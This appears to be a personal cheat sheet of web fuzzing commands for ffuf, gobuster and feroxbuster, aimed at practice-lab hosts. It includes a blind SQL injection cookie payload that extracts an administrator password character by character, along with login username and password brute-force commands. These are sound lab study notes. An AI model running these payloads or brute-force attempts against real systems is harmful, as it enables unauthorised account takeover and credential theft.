---
publish: true
created: 2026-02-06T17:31:52.917+05:30
modified: 2026-06-23T12:14:22.996+05:30
---

### ffuf

- Fuzzing API endpoints.

```bash
ffuf -c -w ~/Github/SecLists/Discovery/Web-Content/common-api-endpoints-mazen160.txt -u http://ultra.thm:8081/FUZZ
```

- request.txt from Burpsuite raw request. FUZZ word inside request.

```bash
ffuf -request request.txt -request-proto http -w /usr/share/seclists/Discovery/Web-Content/local-ports.txt -fs 61
```

- Burpsuite pro alternative. used for SQLi. input via 1 wordlist and 1 stdin. shows only 500 response code results.

```bash
echo {a..z} {0..9} | tr ' ' '\n' | ffuf -w ~/Downloads/numbers.txt:POS -w -:FUZZ -u https://0a64008203b0f40180848fbf0051000a.web-security-academy.net/filter?category=Petss -b "TrackingId=rKptlkPHzEasynoS' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' and substr(password,POS,1)='FUZZ') || '; session=Yiv1znRtIZqAMnODXyVuxSgNbnhudSK1" -mc 500
```

- POST Request.

```
$ ffuf -w ~/Downloads/burp_username.txt -u https://0ae00079042e7b8d80b0671f00ca001c.web-security-academy.net/login -X POST -d "username=FUZZ&password=test"
$ ffuf -w ~/Downloads/burp_password.txt -u https://0ae00079042e7b8d80b0671f00ca001c.web-security-academy.net/login -X POST -d "username=athena&password=FUZZ"
```

### gobuster

```bash
# using a pattern

gobuster dir -u http://inter.thm -w /usr/share/seclists/Discovery/Web-Content/apache.txt -p pattern.txt

# extension

gobuster dir -u "url" -x pdf
```

### feroxbuster

```
$ feroxbuster -u http://variatype.htb:80/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-files.txt -n --insecure --no-state -o ferox.json --json
```
